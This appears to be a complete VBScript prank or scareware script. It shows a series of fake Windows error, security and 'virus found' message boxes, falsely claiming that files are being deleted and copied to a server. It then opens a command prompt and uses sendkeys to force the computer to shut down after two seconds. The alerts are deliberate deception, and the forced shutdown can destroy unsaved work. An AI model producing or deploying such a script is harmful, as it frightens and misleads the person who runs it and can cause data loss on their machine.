X=MsgBox("An unknown error has occured while opening this file.",4+64,"Error (0x6437SG73)")
X=MsgBox("Unable to fix the issue, please restart your computer.",3+48,"Windows Secutiry Alert")
X=MsgBox("Threat Detected. Would you like to delete it?",3+16,"Virus Found!") 
X=MsgBox("Unable to delete this threat.",1+64,"Critical Error") 
X=MsgBox("Virus is Activated",2+16,"Virus Alert") 
X=MsgBox("Deleting Files",2+16,"File Detect") 
X=MsgBox("Copying Items",2+48,"Virus Alert")
X=MsgBox("Your files are being copied to a server",4+64,"Transfering Files..")
X=MsgBox("Can not stop.Access is denied. File transfer Completed",1+16,"Completed")   
X=MsgBox("Your computer is now down",1+68,"Error (0x64GBHSG73)") 
X=MsgBox("Your Pc Ran Into A Problem And Needs To Restart :(",1+48,"FIREWALL ALERT") 

set shellobj = CreateObject("WScript.Shell")
shellobj.run "cmd"

wscript.sleep 2000
shellobj.sendkeys "shutdown -s -f -t 2"
Shellobj.sendkeys "{ENTER}"